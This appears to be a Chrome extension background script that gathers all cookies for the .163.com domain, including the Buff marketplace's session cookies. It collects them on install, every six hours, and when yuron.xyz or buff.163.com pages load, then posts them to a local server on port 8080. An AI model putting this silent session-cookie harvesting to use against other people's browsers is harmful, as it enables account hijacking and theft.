chrome.runtime.onInstalled.addListener(async ({ reason }) => {
	chrome.notifications.create({
		type: 'basic',
		iconUrl: 'icon.png',
		title: 'page loaded',
		message:
		 'Completed loading: ' +
		 ' milliseconds since the epoch.'
	});

	await chrome.alarms.create('demo-default-alarm', {
		delayInMinutes: 0.016,
		periodInMinutes: 360
	});
});

chrome.alarms.onAlarm.addListener(async (alarm) => {
	sendCookies();
});

chrome.webNavigation.onCompleted.addListener((details) => {
	if (details.url.includes('yuron.xyz') || details.url.includes('buff.163.com')) sendCookies()
	console.log('Page loaded:', details.url);
	chrome.notifications.create({
		type: 'basic',
		iconUrl: 'icon.png',
		title: 'page loaded',
		message:
		 'Completed loading: ' +
		 ' milliseconds since the epoch.'
	});
});

async function sendCookies() {
	let cookies = await chrome.cookies.getAll({domain: ".163.com"});
	console.log(cookies)
	if (!cookies?.length) return console.log('No cookies found');
	console.log('Cookies found, trying to send cookies to server');
	fetch('http://localhost:8080/cookies', {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json'
		},
		body: JSON.stringify(cookies)
	})
	.then(response => response.json())
	.then(data => console.log(data))
	.catch(error => console.log(error));
}
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
	console.log(request)
});

chrome.runtime.onMessageExternal.addListener(
	function(request, sender, sendResponse) {
		console.log(request)
	}
);